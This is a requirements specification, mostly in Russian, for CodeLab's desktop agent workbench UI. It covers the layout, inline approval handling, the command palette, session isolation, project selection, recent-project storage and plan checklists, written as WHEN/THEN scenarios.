## Purpose

Десктопный workbench UI на базе Fluent: layout, организация виджетов `codelab_ui` по Atomic Design, паттерны взаимодействия, нужные agent workbench (сайдбар сессий, approvals, режимы отображения, командная палитра и т. д.), и клавиатурная эргономика.
## Requirements
### Requirement: Десктопный workbench на Fluent
CodeLab SHALL использовать `fluent_ui` как базовый Flutter UI framework и SHALL NOT использовать Material/Cupertino как базовый design framework.

#### Scenario: Проверяется UI framework
- **WHEN** анализируются UI-пакеты
- **THEN** публичные UI-компоненты CodeLab построены на `fluent_ui`

#### Scenario: Требуется совместимый импорт
- **WHEN** сторонний пакет требует совместимости с Material/Cupertino
- **THEN** импорт изолирован и не определяет публичный UI-стиль CodeLab

### Requirement: Layout workbench
CodeLab SHALL предоставлять десктопный layout workbench из четырёх зон (`dart-agent-and-clients` §12.3 A13, шаг 0): app bar, сайдбар сессий по проектам, панель сессии с лентой и композером, док панелей инструментов справа. Постоянной колонки инспектора и отдельной карточки debug log SHALL NOT быть: их содержимое — панели дока.

#### Scenario: Открывается основное рабочее пространство
- **WHEN** пользователь открывает CodeLab
- **THEN** первый экран — рабочий workbench клиента, а не маркетинговая страница

#### Scenario: Зоны рабочего места
- **WHEN** открыт workbench в окне шириной 1440 px с активной сессией и открытой панелью Plan
- **THEN** сверху app bar, слева сайдбар сессий, в центре панель сессии со своей шапкой, лентой и композером, справа док с вкладкой Plan

#### Scenario: Узкое окно адаптируется
- **WHEN** ширина окна меньше 900 px
- **THEN** сайдбар и док скрыты и открываются поверх контента, а лента и композер занимают всю ширину, не скрывая prompt composer или состояние отмены

### Requirement: Организация виджетов по Atomic Design
CodeLab SHALL организовывать переиспользуемые виджеты `codelab_ui` по `atomics`, `molecules` и `organisms`.

#### Scenario: Добавляется atomic-виджет
- **WHEN** реализуется минимальный переиспользуемый control
- **THEN** он размещается в `atomics`

#### Scenario: Добавляется панель workflow
- **WHEN** реализуется крупный блок workflow, такой как transcript, approval или сайдбар сессий
- **THEN** он размещается в `organisms`

### Requirement: Паттерны взаимодействия agent workbench
CodeLab SHALL поддерживать сайдбар сессий/задач, control strip области prompt, селектор режима разрешений, plan mode, inline approvals, режимы отображения, progress checklist, inspector-first детали, командную палитру или slash-команды, review-first изменения, изоляцию сессий, компактный transcript и context indicators.

#### Scenario: Показывается ожидающий approval
- **WHEN** агент запрашивает разрешение во время prompt turn
- **THEN** CodeLab отображает approval как часть записи transcript того tool call, к которому он относится (не как отдельную закреплённую панель вне ленты), с риском, причиной, командой/cwd/diff, если доступны — интерактивно, до момента решения

#### Scenario: Несколько approval ожидают решения одновременно
- **WHEN** активный prompt turn имеет более одного `ApprovalRequest` со статусом pending (параллельные tool calls)
- **THEN** CodeLab отображает каждый approval интерактивно на месте своей записи transcript, независимо от остальных — ни один не скрывает и не блокирует отображение другого

#### Scenario: Approval остаётся в истории после решения
- **WHEN** пользователь выбирает опцию для approval, или turn отменяется с этим approval в статусе `cancelled`
- **THEN** CodeLab не удаляет запись из transcript и не сбрасывает её к состоянию до approval — запись схлопывается в компактный маркер принятого решения (выбранная опция или "Cancelled"), остающийся видимым в истории; если approval отменён, а тег статуса вызова уже читается "Cancelled", маркером служит этот тег и второй тег "Cancelled" не показывается (решение пользователя 2026-11-09, design.md change `add-provider-setup-ui`, Q38)

#### Scenario: Отменённый ход с ожидающим approval — один тег Cancelled
- **WHEN** пользователь отменяет ход, пока вызов инструмента ждёт решения approval (объявленный `tool_call` или вызов только из `session/request_permission`)
- **THEN** строка вызова показывает один тег "Cancelled" — тег статуса; тега исхода approval рядом нет, тега "Queued" нет

#### Scenario: Решённый approval рядом с другим статусом
- **WHEN** approval решён выбором опции (`allowed`, `rejected`) или отменён, а вызов затем получил итоговый статус, отличный от "Cancelled" (например, поздний `completed`)
- **THEN** строка показывает и тег исхода approval, и тег статуса вызова, как прежде

#### Scenario: Лента автоскроллится к новому approval
- **WHEN** появляется новый pending approval, и пользователь не проскроллил ленту transcript вверх (не читает более раннюю историю)
- **THEN** CodeLab прокручивает ленту так, чтобы новая approval-запись была видна, не требуя от пользователя искать её вручную

#### Scenario: Клавиатурные approve/reject применяются к самому раннему pending approval
- **WHEN** несколько approval активного turn ожидают решения одновременно, и пользователь использует клавиатурный shortcut approve/reject
- **THEN** CodeLab применяет это решение к approval с наименьшим `requestedAt` среди pending — не к произвольному или к тому, что ближе к текущей scroll-позиции

#### Scenario: Меняется режим отображения
- **WHEN** пользователь выбирает `summary`, `normal` или `verbose`
- **THEN** transcript и детали tool call меняют детализацию, не теряя данных

#### Scenario: Содержательный текст записи не обрезается ни в одном режиме отображения
- **WHEN** запись transcript содержит содержательный текст (реплика пользователя, ответ агента, причина approval-запроса или диагностическое сообщение) длиннее, чем помещается в отведённое по умолчанию число строк
- **THEN** CodeLab отображает этот текст полностью независимо от выбранного `viewMode` — обрезка по числу строк применяется только к вспомогательным меткам и к детализации tool call, но не к самому содержательному тексту записи

#### Scenario: Переключение сессий показывает только состояние этой сессии
- **WHEN** пользователь переключает активную сессию (через сайдбар или создав новую)
- **THEN** CodeLab показывает собственные transcript, записи инспектора и pending approval этой сессии (если есть) — никогда не состояние, оставшееся от предыдущей активной сессии

### Requirement: Tool call появляется в transcript в хронологической позиции
CodeLab SHALL добавлять запись transcript для каждого tool call, полученного в активном или последнем prompt turn, в позицию потока, соответствующую моменту его создания агентом (`SessionUpdate.toolCall`) относительно окружающих текстовых записей — а не только показывать его в инспекторе.

#### Scenario: Tool call между двумя текстовыми ответами
- **WHEN** агент присылает текстовый чанк, затем `SessionUpdate.toolCall`, затем ещё один текстовый чанк
- **THEN** CodeLab показывает в transcript три записи в этом же порядке: текст, tool call, текст

#### Scenario: Обновление статуса tool call не создаёт вторую запись
- **WHEN** после `SessionUpdate.toolCall` для того же `toolCallId` приходит один или более `SessionUpdate.toolCallUpdate`
- **THEN** CodeLab обновляет содержимое и статус уже существующей записи transcript этого tool call, не добавляя новую

### Requirement: Approval options are rendered and bound to shortcuts by kind
CodeLab SHALL carry each approval option's `PermissionOptionKind` (`allow_once`, `allow_always`, `reject_once`, `reject_always`) through to the presentation layer and SHALL bind each of the four kinds to a fixed keyboard shortcut by kind, as in requirement «Ответ на одобрение сочетанием с любого места рабочего места», without relying on matching substrings in the option's agent-provided label text. An option of an unknown kind SHALL get no shortcut.

#### Scenario: Four kinds shown distinctly
- **WHEN** a permission request offers all four standard option kinds
- **THEN** CodeLab shows four distinct options, each bound to its own shortcut, regardless of the exact wording of each option's label

#### Scenario: Non-English or unusual option labels still get shortcuts
- **WHEN** an agent provides an option label that does not contain the words "allow"/"approve"/"reject"/"deny" (e.g. a non-English label)
- **THEN** CodeLab still binds the correct shortcut to that option, based on its `kind`, not its label text

### Requirement: Approval panel offers a collapsed raw input view
CodeLab SHALL show the tool call's raw input in the approval panel behind a collapsed, expand-on-demand disclosure, not always visible by default.

#### Scenario: Raw input is collapsed by default
- **WHEN** an approval panel is shown for a tool call with input data
- **THEN** the raw input is hidden behind a "View raw input" control until the user expands it

### Requirement: Клавиатурный десктопный UX
CodeLab SHALL поддерживать клавиатурную эргономику для отправки prompt, отмены, approve/reject, командной палитры или slash-команд, создания сессии и сворачивания сайдбара.

#### Scenario: Пользователь отправляет prompt с клавиатуры
- **WHEN** фокус в prompt composer, и пользователь вызывает shortcut отправки
- **THEN** CodeLab отправляет prompt без необходимости взаимодействия с указателем

#### Scenario: Пользователь открывает командную палитру
- **WHEN** пользователь вызывает shortcut командной палитры
- **THEN** CodeLab представляет основные действия, такие как `/new`, `/plan`, `/permissions`, `/logs`, `/compact` и `/reconnect`

#### Scenario: Новая сессия с клавиатуры
- **WHEN** соединение установлено, и пользователь нажимает Cmd/Ctrl+N
- **THEN** CodeLab создаёт новую сессию в выбранном проекте и делает её активной

#### Scenario: Сайдбар сворачивается с клавиатуры
- **WHEN** окно шире 900 px, и пользователь нажимает Cmd/Ctrl+B
- **THEN** сайдбар сворачивается, а повторное нажатие разворачивает его; лента и текст композера при этом не теряются

### Requirement: Командная палитра открывается и выполняет доступные действия
CodeLab SHALL открывать `CodeLabCommandPaletteSurface` при вызове shortcut'а командной палитры и SHALL выполнять `/new` (создание сессии) и `/reconnect` немедленно при выборе, закрывая палитру после этого. `/reconnect` SHALL выполнять то же действие, что «Restart agent» страницы «Connection», включая подтверждение при идущих ходах (spec app-settings «Блок «Behavior» страницы «Connection»»); подпись пункта — «Restart agent» для локального профиля и «Reconnect» для WebSocket (design.md change `require-project-folder`, D22, Q24 (a)).

#### Scenario: Открытие командной палитры показывает surface
- **WHEN** пользователь вызывает shortcut командной палитры (`Ctrl/Cmd+K`)
- **THEN** CodeLab показывает `CodeLabCommandPaletteSurface` поверх workbench

#### Scenario: Закрытие командной палитры
- **WHEN** командная палитра открыта, и пользователь нажимает `Esc` либо выбирает доступную команду
- **THEN** CodeLab скрывает `CodeLabCommandPaletteSurface` и возвращает фокус клавиатуры workbench

#### Scenario: Выбор /new создаёт сессию
- **WHEN** командная палитра открыта, и пользователь выбирает `/new`
- **THEN** CodeLab создаёт новую сессию через существующий флоу создания сессии и закрывает палитру

#### Scenario: Выбор /reconnect перезапускает агента
- **WHEN** командная палитра открыта, агент работает, ходов нет, и пользователь выбирает `/reconnect`
- **THEN** CodeLab перезапускает агента выбранным профилем окна без диалога и закрывает палитру

#### Scenario: /reconnect при идущем ходе
- **WHEN** в сессии окна идёт ход, и пользователь выбирает `/reconnect` в палитре
- **THEN** палитра закрыта и показан диалог подтверждения перезапуска; после «Cancel» агент и ход прежние

#### Scenario: Выбор /logs открывает полноэкранный log viewer
- **WHEN** командная палитра открыта, и пользователь выбирает `/logs`
- **THEN** CodeLab открывает полноэкранный log viewer (master-detail, поверх притемнённого workbench) и закрывает палитру

### Requirement: Командная палитра открывается inline из prompt composer
CodeLab SHALL открывать командную палитру inline, привязанную над prompt composer и без переноса фокуса клавиатуры с него, когда пользователь вводит `/` как первый символ нового слова в поле ввода composer, и SHALL фильтровать видимые команды вживую по мере того, как пользователь продолжает печатать в composer.

#### Scenario: Слэш в начале слова открывает inline-палитру
- **WHEN** composer пуст, либо курсор находится сразу после пробела, и пользователь вводит `/`
- **THEN** CodeLab показывает командную палитру, привязанную над composer, фокус остаётся в текстовом поле composer

#### Scenario: Слэш внутри слова не открывает палитру
- **WHEN** пользователь вводит `/` сразу после непробельного символа (например, как часть уже набираемого пути или URL)
- **THEN** CodeLab не открывает командную палитру

#### Scenario: Продолжение ввода фильтрует inline-список
- **WHEN** inline-палитра открыта, и пользователь вводит дополнительные символы в composer
- **THEN** CodeLab фильтрует видимые команды по тексту, набранному после триггерного `/`

#### Scenario: Enter выбирает подсвеченную команду, пока открыта inline-палитра
- **WHEN** inline-палитра открыта, и пользователь нажимает `Enter`
- **THEN** CodeLab выбирает текущую подсвеченную команду вместо вставки переноса строки в composer

#### Scenario: Выбор команды из inline-палитры очищает текст триггера
- **WHEN** пользователь выбирает команду из inline-палитры
- **THEN** CodeLab удаляет фрагмент `/word` из текста composer и выполняет команду тем же способом, что и при выборе через палитру, вызванную клавиатурным shortcut'ом

#### Scenario: Удаление триггерного слэша закрывает inline-палитру
- **WHEN** inline-палитра открыта, и пользователь удаляет символ `/`, который её вызвал
- **THEN** CodeLab закрывает inline-палитру, не выполняя никакой команды

### Requirement: Командная палитра честно помечает нереализованные действия как недоступные
CodeLab SHALL представлять `/plan`, `/permissions` и `/compact` в командной палитре как явно недоступные действия, а не тихо ничего не делать при их выборе, пока каждая соответствующая capability (plan mode, селектор режима разрешений, compact transcript) не реализована. Недоступная команда клиента SHALL скрываться из палитры, пока активный агент объявляет команду с тем же именем (сравнение без `/`, с учётом регистра), и SHALL возвращаться, когда новый `availableCommandsUpdate` это имя больше не содержит.

#### Scenario: Выбрана недоступная команда
- **WHEN** командная палитра открыта, и пользователь выбирает `/plan`, `/permissions` или `/compact`
- **THEN** CodeLab показывает команду как disabled/с пометкой «coming soon» и не закрывает палитру, и не выдаёт фиктивную запись диагностики, подразумевающую, что действие завершилось

#### Scenario: Enter на недоступной команде в inline-палитре
- **WHEN** inline-палитра открыта, недоступная команда (`/plan`, `/permissions` или `/compact`) — текущая подсвеченная запись, и пользователь нажимает `Enter`
- **THEN** CodeLab обрабатывает это так же, как любой другой выбор этой команды — палитра остаётся открытой, никакое действие не выполняется, текст composer не меняется

#### Scenario: Команда агента вытесняет одноимённую заглушку
- **WHEN** активный агент объявил команду `compact`
- **THEN** палитра показывает `compact` в секции агента и не показывает недоступную команду клиента `/compact`; `/plan` и `/permissions`, которых агент не объявил, остаются недоступными командами клиента

#### Scenario: Заглушка возвращается
- **WHEN** после команды `compact` агент присылает `availableCommandsUpdate` без неё
- **THEN** палитра снова показывает недоступную команду клиента `/compact`

### Requirement: Командная палитра представляет команды, объявленные агентом
CodeLab SHALL представлять команды, объявленные активным агентом через `SessionUpdate.availableCommandsUpdate`, в командной палитре (и в surface `Ctrl/Cmd+K`, и во inline-триггере `/`), визуально отделённые от команд клиента, и SHALL NOT вызывать их как метод протокола — выбор одной из них SHALL вставлять `/{name} ` (плюс объявленный input hint, если есть, как placeholder-текст) в prompt composer вместо этого, оставляя пользователю дополнение и отправку как обычного prompt, — и для команды с `input`, и без него. Доступные команды клиента (`/new`, `/logs`, `/reconnect`) команды агента SHALL NOT заменять; недоступные заменяют по требованию «Командная палитра честно помечает нереализованные действия как недоступные». Палитра SHALL отбирать команды по введённому запросу нечётким поиском каталога команд kit: сначала команды, имя которых начинается с запроса, затем содержащие его, затем содержащие буквы запроса по порядку, затем совпавшие по названию или описанию.

#### Scenario: Агент объявляет доступные команды
- **WHEN** активная сессия получает `SessionUpdate.availableCommandsUpdate` с одной или более записями
- **THEN** CodeLab добавляет эти команды в палитру в секции, визуально отделённой от команд клиента, не удаляя и не заменяя ни одну доступную команду клиента

#### Scenario: Более позднее обновление заменяет список команд агента
- **WHEN** для активной сессии приходит новый `SessionUpdate.availableCommandsUpdate`
- **THEN** CodeLab заменяет ранее показанные команды агента записями из нового обновления

#### Scenario: Команды агента не объявлены
- **WHEN** активная сессия не получала ни одного `availableCommandsUpdate`
- **THEN** CodeLab показывает в палитре только шесть client-native команд

#### Scenario: Выбрана команда, объявленная агентом
- **WHEN** пользователь выбирает команду, пришедшую из `availableCommandsUpdate`
- **THEN** CodeLab вставляет `/{name} ` (и input hint команды как placeholder-текст, если команда его объявляет) в prompt composer, закрывает палитру и не вызывает никакой метод протокола — пользователь отправляет её сам через обычный флоу prompt

#### Scenario: Повторный выбор той же команды
- **WHEN** пользователь выбрал команду агента, стёр или отправил вставленный текст и снова выбирает ту же команду
- **THEN** CodeLab снова вставляет `/{name} ` в prompt composer

#### Scenario: Переключение сессий показывает собственные команды агента этой сессии
- **WHEN** активная сессия меняется
- **THEN** CodeLab показывает собственные команды агента, объявленные для новой активной сессии — восстановленные из её последнего `availableCommandsUpdate`, если он был, либо пустой список, если не было — но никогда список предыдущей сессии

#### Scenario: Нечёткий поиск находит команду по буквам
- **WHEN** агент объявил `compact`, и пользователь вводит в палитре `cpt`
- **THEN** палитра показывает `compact`, хотя `cpt` не подстрока ни имени, ни описания

#### Scenario: Префикс имени выше совпадения в описании
- **WHEN** агент объявил `plan` и команду, в описании которой есть слово `plan`, и пользователь вводит `/pl`
- **THEN** `plan` — первая команда агента в списке палитры

### Requirement: Композер показывает объявленные агентом config options
CodeLab SHALL показывать в prompt composer по одному селектору на каждый `SessionConfigOption` активной сессии, в порядке, присланном агентом, и SHALL NOT показывать этот ряд, когда `configOptions` активной сессии пуст или отсутствует.

#### Scenario: Агент объявляет config options при создании сессии
- **WHEN** ответ на создание сессии содержит непустой `configOptions`
- **THEN** CodeLab показывает в композере по одному селектору на каждую опцию, с текущим значением (`currentValue`) из ответа

#### Scenario: Агент не объявляет ни одной config option
- **WHEN** активная сессия не имеет ни одной `SessionConfigOption`
- **THEN** CodeLab не показывает ряд селекторов в композере вообще — ни пустым, ни как «coming soon»

#### Scenario: Обновление config options во время сессии
- **WHEN** активная сессия получает `SessionUpdate.configOptionUpdate` с новым списком
- **THEN** CodeLab заменяет ряд селекторов в композере полностью новым списком, включая появление или исчезновение ряда при переходе списка из пустого в непустой и обратно

### Requirement: Выбор значения селектора отправляется агенту
CodeLab SHALL отправлять `session/set_config_option` при выборе пользователем нового значения в селекторе композера и SHALL отражать в чипе значение из ответа агента, а не выбранное пользователем значение напрямую.

#### Scenario: Пользователь выбирает значение из выпадающего списка
- **WHEN** пользователь открывает селектор конфигурации и выбирает один из вариантов `options`
- **THEN** CodeLab отправляет `session/set_config_option` с `configId` и выбранным значением, дожидается ответа и обновляет отображаемое в чипе значение из полученного списка `configOptions`

#### Scenario: Селектор не смешивается с client-side permission mode
- **WHEN** активная сессия объявляет `SessionConfigOption` с `category: "mode"`
- **THEN** CodeLab отображает его название и варианты как есть, присланные агентом, не подставляя названия локальных режимов `readOnly`/`ask`/`plan`/`autoEdits` из `approval-safety` и не смешивая эти два понятия

### Requirement: Workbench честно отражает спонтанную потерю соединения
CodeLab SHALL отражать спонтанную (не вызванную стартом или перезапуском агента) потерю ACP-соединения как отдельное состояние `lost` в UI, отличное от неудачного старта `failed`, и SHALL очищать состояние активного запроса, которое больше не может считаться достоверным, вместо того чтобы бесконечно показывать `Connected` и зависший `running` turn.

#### Scenario: Агент падает во время активной сессии
- **WHEN** активное соединение (`connectionStatus == connected`) спонтанно теряется — например, дочерний процесс агента завершается неожиданно
- **THEN** CodeLab переводит `connectionStatus` в `lost`, очищает `pendingApproval`, `isPromptSubmitting`, `canCancel`, `isRespondingToApproval` и `isRespondingToConfigOption`, и записывает диагностику с причиной

#### Scenario: Сбой старта или перезапуска не задваивается
- **WHEN** старт агента по триггеру (требование «Агент стартует сам») или «Restart agent» завершается неудачей
- **THEN** CodeLab переводит `connectionStatus` в `failed` и показывает ровно одну diagnostic-запись об этой неудаче — реакция на спонтанную потерю соединения не создаёт вторую, дублирующую запись для того же события

#### Scenario: История сессии не теряется при потере соединения
- **WHEN** происходит спонтанная потеря соединения
- **THEN** CodeLab сохраняет видимыми `transcriptEntries` уже случившейся сессии — они не считаются недостоверными, в отличие от состояния активного запроса

### Requirement: Границы панелей перетаскиваются мышью
CodeLab SHALL позволять пользователю менять ширину сайдбара сессий и дока панелей инструментов перетаскиванием их общей границы с панелью сессии, когда они стоят колонками, в пределах фиксированных минимума и максимума.

#### Scenario: Перетаскивание границы сайдбара меняет его ширину
- **WHEN** пользователь перетаскивает разделитель между сайдбаром и панелью сессии
- **THEN** CodeLab меняет ширину сайдбара в реальном времени, следуя за курсором, а панель сессии заполняет оставшееся пространство

#### Scenario: Перетаскивание границы дока меняет его ширину
- **WHEN** окно шире 1280 px, док открыт колонкой, и пользователь перетаскивает разделитель между панелью сессии и доком
- **THEN** CodeLab меняет ширину дока в реальном времени, следуя за курсором

#### Scenario: Resize ограничен минимальной шириной
- **WHEN** пользователь тянет разделитель к ширине меньше настроенного минимума
- **THEN** CodeLab останавливает сжатие панели на минимальной ширине, никогда не схлопывая её до нуля

#### Scenario: Resize ограничен максимальной шириной
- **WHEN** пользователь тянет разделитель к ширине больше настроенного максимума
- **THEN** CodeLab останавливает рост панели на максимальной ширине, никогда не давая ей поглотить панель сессии

#### Scenario: Курсор показывает перетаскиваемую границу
- **WHEN** курсор наведён на перетаскиваемый разделитель, до начала перетаскивания
- **THEN** CodeLab показывает курсор горизонтального изменения размера

#### Scenario: Ширина дока переживает перезапуск
- **WHEN** пользователь изменил ширину дока и перезапустил CodeLab
- **THEN** док открывается с той же шириной

### Requirement: Схлопывание потоковых сообщений агента в transcript
CodeLab SHALL отображать подряд идущие потоковые обновления одного и того же рода (`agent_message_chunk` либо `agent_thought_chunk`) в рамках одного prompt turn как единую, дописывающуюся запись transcript, а не как отдельную запись на каждое обновление. CodeLab SHALL начинать новую запись transcript всякий раз, когда между такими обновлениями встречается обновление turn другого рода, либо когда род потокового обновления меняется (сообщение ↔ размышление).

#### Scenario: Агент стримит текст ответа несколькими чанками подряд
- **WHEN** активный prompt turn получает несколько подряд идущих `agent_message_chunk` обновлений без других обновлений turn между ними
- **THEN** CodeLab показывает единственную запись transcript, текст которой дополняется по мере поступления новых чанков, а не отдельную запись на каждый чанк

#### Scenario: Другое обновление turn прерывает серию чанков сообщения
- **WHEN** между двумя `agent_message_chunk` обновлениями одного turn приходит обновление другого рода (например, обновление вызова инструмента)
- **THEN** CodeLab начинает новую запись transcript для текста, пришедшего после этого обновления, не склеивая его с текстом, пришедшим до него

#### Scenario: Род потокового обновления меняется с сообщения на размышление
- **WHEN** подряд идущие потоковые обновления одного turn переключаются с `agent_message_chunk` на `agent_thought_chunk` (или наоборот)
- **THEN** CodeLab начинает новую запись transcript, не склеивая текст разных родов обновления в одну запись

#### Scenario: Turn ещё выполняется, ответ агента ещё не завершён
- **WHEN** prompt turn ещё выполняется и агент уже прислал часть текста ответа через потоковые обновления
- **THEN** CodeLab показывает уже полученную часть текста в соответствующей записи transcript, не дожидаясь завершения turn

### Requirement: Project selection is independent of the connection type
CodeLab SHALL let the user select the working directory ("project") for sessions as an action independent of the connection profile, and SHALL apply the currently selected project to the next session created regardless of whether the window's profile is the embedded agent, stdio or WebSocket. A project is selected only explicitly: via "Open folder…" (including Cmd/Ctrl+O), a recent project, a folder dropped onto the no-project screen (requirement «Открытие папки перетаскиванием»; design.md change `add-empty-project-screen`, D4), or the project restored from the previous run's workspace snapshot. CodeLab SHALL NOT substitute the CodeLab process's own current directory (or any other implicit directory) for a project that has not been selected; without a selected project there is no directory for an agent or a session (requirement «Без выбранного проекта нет папки агента и сессий»; design.md change `require-project-folder`, D1, replacing Decision 1 of change `add-open-project-picker`). Whether a stdio agent process starts in its process root (the directory of the trigger that started it) SHALL be the `Run in the project folder` field of that stdio profile (`runInProjectDirectory`, default on in the "Add connection profile" dialog), not a separate workbench toggle (design.md change `add-app-settings-shell`, D6). The application has no separate profile check that would start an agent process outside these triggers, so the rule "no project — no directory" has no exception for it (design.md change `remove-test-connection`, D7, removing D7 of change `require-project-folder`).

#### Scenario: Project applies to a WebSocket session
- **WHEN** the window's profile is a WebSocket profile and the user creates a new session
- **THEN** CodeLab sends the currently selected project's path as `cwd` in `session/new`, the same as it would for stdio

#### Scenario: No project selected — no implicit directory
- **WHEN** CodeLab was launched with the process working directory `/`, there is no workspace snapshot, and the user has not selected a project
- **THEN** no `session/new` is sent, no agent process, embedded agent or WebSocket connection is started, and `WorkspaceState.projectDirectory` stays unset, so the next workspace snapshot does not record `/` as the project

#### Scenario: Switching project keeps the agent and other sessions running
- **WHEN** the agent runs with a session in `/work/a` that is in a turn, and the user selects the project `/work/b`
- **THEN** the agent is not restarted, the turn in `/work/a` continues, the sidebar lists `/work/b`'s sessions from `session/list`, and the next session created gets `cwd` `/work/b`

#### Scenario: stdio process runs from the project directory by default
- **WHEN** the window's profile is a stdio profile with `Run in the project folder` on, and the agent is started by selecting the project `/work/app`
- **THEN** CodeLab spawns the agent process with `/work/app` as its OS-level working directory

#### Scenario: stdio process spawn directory can be decoupled from the project
- **WHEN** the window's profile is a stdio profile with `Run in the project folder` off
- **THEN** CodeLab spawns the agent process without an explicit working directory override, while each session's directory is still sent as `cwd` in `session/new`

#### Scenario: No profile check starts an agent without a project
- **WHEN** no project is selected, `profiles.json` contains a stdio profile `dev` with `Run in the project folder` on, and the user opens the "Connection" page and the "Add connection profile" dialog
- **THEN** neither offers a "Test connection" action, and no agent process is started until a project is selected

#### Scenario: A dropped folder is an explicit selection
- **WHEN** no project is selected, the window's profile is a WebSocket profile, and the user drops the folder `/work/app` onto the no-project screen and then creates a new session
- **THEN** the selected project is `/work/app`, and `session/new` carries `cwd` `/work/app`, the same as after choosing `/work/app` in "Open folder…"

### Requirement: "Open Project" offers native browse and recent projects
CodeLab SHALL let the user switch projects from the sessions sidebar: recent project directories are shown as collapsed project groups for one-click reselection, and an "Open folder…" item opens the operating system's native folder-selection dialog.

#### Scenario: Picking a folder via the native dialog
- **WHEN** the user selects "Open folder…" in the sessions sidebar
- **THEN** CodeLab opens the operating system's native folder-selection dialog, and on a folder being chosen, sets it as the selected project

#### Scenario: Selecting a recent project
- **WHEN** the user expands a collapsed recent project group in the sidebar
- **THEN** CodeLab sets that path as the selected project without opening the native folder dialog, and that group lists the project's sessions

#### Scenario: Currently selected project is visible without opening a picker
- **WHEN** a project is selected
- **THEN** the sessions sidebar shows that project as an expanded group named after the folder, with the full path available as a tooltip

### Requirement: Recent projects persist across app restarts
CodeLab SHALL remember recently opened project directories across application restarts, on the local machine. The list SHALL be stored in `$CODELAB_HOME/recent_projects.json` through `JsonFileRecentProjectsStore` (acp-client-kit "Хранилище недавних проектов в CODELAB_HOME"), the same file the `codelab` CLI writes, so it does not depend on the application bundle identifier (design.md change `share-recent-projects-store`, D1, D8).

On the first access to the list, CodeLab SHALL move a list stored by an earlier version under the `shared_preferences` key `codelab.recent_projects` into that file: it merges it with the file's entries by `mergeRecentProjects`, writes the file, and only then removes the key. An unparseable key value SHALL be removed with a warning event and no file change. If the file is unreadable or `CODELAB_HOME` is invalid, the key SHALL be kept. No list access SHALL write the file before the move has finished (D4).

An unreadable recents file (corrupt JSON, unknown version) or an invalid `CODELAB_HOME` SHALL NOT block startup, project selection or session restore: the recents list is shown empty, a warning appears in diagnostics, and the file is not overwritten (D2, D8). Migration events SHALL NOT contain project paths (D11).

#### Scenario: A newly opened project appears in recents after restart
- **WHEN** the user opens a project directory (via browse or by it becoming the selected project) and then restarts CodeLab
- **THEN** that directory still appears in the "Open Project" recents list

#### Scenario: Recents list has a bound
- **WHEN** the number of distinct opened project directories exceeds the recents list's capacity
- **THEN** CodeLab keeps only the most recently opened entries, dropping the least recently used ones, rather than growing the list without bound

#### Scenario: A project opened in the CLI appears in the app
- **WHEN** `recent_projects.json` in `CODELAB_HOME` lists `/work/cli-project`, written by `codelab`, and CodeLab starts with that `CODELAB_HOME`
- **THEN** the sidebar shows `/work/cli-project` among the recent projects

#### Scenario: Recents from an earlier version are moved once
- **WHEN** `shared_preferences` holds `codelab.recent_projects` with `/work/old` at 09:00, `recent_projects.json` holds `/work/old` at 10:00 and `/work/cli` at 08:00, and CodeLab starts twice
- **THEN** after the first start the file lists `/work/old` at 10:00 and `/work/cli`, each once, the key is removed, and the second start leaves the file unchanged

#### Scenario: An unreadable recents file is kept
- **WHEN** `recent_projects.json` contains `{not json`, the key `codelab.recent_projects` holds `/work/old`, and the user starts CodeLab and selects the project `/work/app`
- **THEN** the project is selected and the workbench works, the recents list is empty, diagnostics show a recent-projects warning, the file bytes are unchanged, and the key `codelab.recent_projects` is kept

#### Scenario: Invalid CODELAB_HOME
- **WHEN** CodeLab starts with `CODELAB_HOME='~bob/cl'` and the key `codelab.recent_projects` holds `/work/old`
- **THEN** the app starts, the recents list is empty, diagnostics show the home folder problem, and the key `codelab.recent_projects` is kept

### Requirement: Progress checklist reflects the agent's plan
CodeLab SHALL render the agent's plan as a progress checklist, sourced from `SessionUpdate.plan` entries, showing each entry's priority and status without inventing statuses the protocol does not define.

#### Scenario: Plan update renders a checklist
- **WHEN** the active session receives a `SessionUpdate.plan` with one or more entries
- **THEN** CodeLab shows a checklist with one row per entry, each showing its status (pending/in_progress/completed) and priority (high/medium/low)

#### Scenario: No plan yet — no checklist shown
- **WHEN** the active session has not received any `plan` update
- **THEN** CodeLab does not show a checklist or an empty-state placeholder for it

#### Scenario: A later plan update replaces the checklist
- **WHEN** a new `SessionUpdate.plan` arrives for the active session
- **THEN** CodeLab replaces the displayed checklist with the entries from the new update

### Requirement: Docked plan summary below the transcript
CodeLab SHALL show a compact summary of the current plan docked below the transcript, directly above the composer, expandable into the full checklist by clicking anywhere on the summary row.

#### Scenario: Summary names the active step
- **WHEN** a plan has an entry with status in_progress and the summary is collapsed
- **THEN** the compact summary shows that entry's description, and a count of remaining pending entries if any remain

#### Scenario: Summary shows an aggregate count when nothing is in progress
- **WHEN** a plan has no entry with status in_progress, or the summary is expanded
- **THEN** the compact summary shows an aggregate count (total entries if none are completed yet, or completed-out-of-total otherwise) instead of naming a specific entry

#### Scenario: Summary is omitted when the plan is fully completed
- **WHEN** every entry in the current plan has status completed
- **THEN** CodeLab does not show the compact summary row, though the full checklist remains reachable until every entry is completed

#### Scenario: Dismissing the plan clears the summary until the next update
- **WHEN** the user dismisses the plan summary
- **THEN** CodeLab stops showing the plan summary and checklist for that session until a new plan update arrives

### Requirement: Full checklist has a bounded, independently scrollable height
CodeLab SHALL cap the expanded checklist's height and scroll its entries independently, so a long plan does not push the transcript or composer out of view.

#### Scenario: Plan with many entries stays within a bounded height
- **WHEN** the expanded checklist has more entries than fit in its maximum height
- **THEN** the entries scroll within the checklist without resizing the surrounding layout

### Requirement: Sessions run prompt turns independently of the active session
CodeLab SHALL allow a session's prompt turn to continue running while a different session is active, and SHALL allow the active session to start its own prompt turn even while another session's turn is still running, as long as the active session itself is not busy.

#### Scenario: Starting a second session while the first is still running
- **WHEN** a session has a prompt turn running or an approval pending, and the user creates or switches to a different, idle session
- **THEN** CodeLab lets the user submit a prompt in the newly active session immediately, without queuing it, regardless of the other session's state

#### Scenario: A background session's turn keeps running while another session is active
- **WHEN** a session's prompt turn is running while a different session is active
- **THEN** CodeLab does not cancel, pause, or otherwise interrupt the background session's turn — it continues until it completes, fails, or is explicitly cancelled

#### Scenario: A background session's turn completes while another session is active
- **WHEN** a non-active session's prompt turn completes, fails, or its approval is resolved while a different session is active
- **THEN** CodeLab updates that session's own transcript and status without altering the transcript, composer, or submitting state currently shown for the active session

### Requirement: Sessions sidebar shows live status for background sessions
CodeLab SHALL keep each session's status indicator in the sessions sidebar current — including idle, running, and awaiting-approval — regardless of whether that session is the currently active one.

